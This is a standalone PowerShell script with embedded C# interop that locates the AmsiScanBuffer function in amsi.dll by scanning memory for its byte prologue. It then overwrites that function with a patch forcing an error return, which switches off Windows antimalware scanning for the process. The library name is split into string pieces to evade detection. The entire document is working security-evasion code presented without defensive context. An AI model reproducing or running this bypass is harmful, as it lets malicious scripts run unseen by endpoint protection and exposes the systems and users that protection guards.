$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0
            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }
        return $address
    }
}

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
[byte[]]$egg = [byte[]] (
    0x4C, 0x8B, 0xDC,       # mov     r11,rsp
    0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
    0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
    0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
    0x57,                   # push    rdi
    0x41, 0x56,             # push    r14
    0x41, 0x57,             # push    r15
    0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
)
$ASBAddress = [Hunter]::FindAddress($LoadLibrary, $egg)
Write-Host "amsi.dll address: $LoadLibrary"
Write-Host "ASB Address:      $ASBAddress"

$oldProtect = 0
[Win32]::VirtualProtect($ASBAddress, [uint32]5, 0x40, [ref]$oldProtect) | Out-null
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $ASBAddress, $Patch.Length)

$newProtect = 0
[Win32]::VirtualProtect($ASBAddress, [uint32]5, $oldProtect, [ref]$newProtect) | Out-null
